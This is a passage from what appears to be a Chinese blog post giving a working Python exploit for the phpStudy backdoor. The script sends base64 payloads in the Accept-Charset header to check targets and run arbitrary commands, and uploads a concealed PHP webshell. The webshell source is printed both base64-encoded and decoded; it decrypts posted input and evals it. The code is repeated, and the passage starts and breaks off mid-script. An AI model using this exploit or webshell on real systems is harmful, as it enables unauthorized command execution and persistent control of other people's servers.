.NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The Target Url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w8'</span>,<span class="string">'--webshell_8'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2018'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w6'</span>,<span class="string">'--webshell_6'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2016'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(parse.print_help())</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">and</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.check_Target()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_8:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2018()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_6:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2016()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>phpstudy 2018</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png" alt></p>
<p>phpstudy 2016</p>
<blockquote>
<p>唯一有变化的就是上传shell的时候，根路径和2018不一样,路径修改如下</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">'./WWW/about.php'</span>, <span class="string">'&lt;?php</span></span><br><span class="line"><span class="string">@error_reporting(0);</span></span><br><span class="line"><span class="string">session_start();</span></span><br><span class="line"><span class="string">if (isset($_GET["pass"]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=substr(md5(uniqid(rand())),16);</span></span><br><span class="line"><span class="string">    $_SESSION["k"]=$key;</span></span><br><span class="line"><span class="string">    print $key;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=$_SESSION["k"];</span></span><br><span class="line"><span class="string">	$post=file_get_contents("php://input");</span></span><br><span class="line"><span class="string">	if(!extension_loaded("openssl"))</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$t="base64_"."decode";</span></span><br><span class="line"><span class="string">		$post=$t($post."");</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span></span><br><span class="line"><span class="string">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span></span><br><span class="line"><span class="string">    			&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$post=openssl_decrypt($post, "AES128", $key);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">    $arr=explode("|",$post);</span></span><br><span class="line"><span class="string">    $func=$arr[0];</span></span><br><span class="line"><span class="string">    $params=$arr[1];</span></span><br><span class="line"><span class="string">	class C&#123;public function __construct($p) &#123;eval($p."");&#125;&#125;</span></span><br><span class="line"><span class="string">	@new C($params);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;'</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png" alt></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png" alt></p>
<h4 id="不带参数检测、利用、传shell"><a href="#不带参数检测、利用、传shell" class="headerlink" title="不带参数检测、利用、传shell"></a>不带参数检测、利用、传shell</h4><blockquote>
<p>和带参数的效果一样，就不放图了，不同的是执行命令传shell时没有解析参数时被转义的问题了</p>
</blockquote>
<p>code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            